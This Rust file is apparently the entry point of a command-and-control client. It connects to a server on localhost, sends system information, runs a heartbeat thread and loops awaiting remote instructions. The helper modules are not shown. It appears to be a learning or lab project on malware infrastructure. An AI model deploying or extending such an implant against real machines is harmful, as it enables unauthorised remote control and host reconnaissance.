use std::io::{self};
use std::net::TcpStream;
use std::thread;
use crate::worker::utils::{send_heartbeat_loop, listening_for_instructions, send_sys_info};

mod config;
mod worker;

/// The main entry point of the client application.
///
/// Establishes a connection to the server for command and control operations,
/// sends initial system information to the server, and manages separate
/// functionalities for sending heartbeats and listening for instructions.
fn main() -> io::Result<()> {
    let ip = "127.0.0.1".to_string();
    let port = "49151".to_string();
    let mut stream = TcpStream::connect(format!("{}:{}", ip, port))?;

    println!("[I] Connected to server {}:{}.", ip, port);

    // Send basic sysinfo for the C2 server
    send_sys_info(&mut stream);

    // Thread dedicated to send heartbeats
    thread::spawn(move || {
        let heartbeat_ip = "127.0.0.1".to_string();
        let heartbeat_port = "52222".to_string();

        let mut heart_stream = TcpStream::connect(
            format!("{}:{}",heartbeat_ip, heartbeat_port)).unwrap();

        println!("[I] Connected to server {}:{}.", heartbeat_ip, heartbeat_port);
        send_heartbeat_loop(&mut heart_stream);
    });

    // Infinite loop
    listening_for_instructions(&mut stream).unwrap();

    Ok(())
}

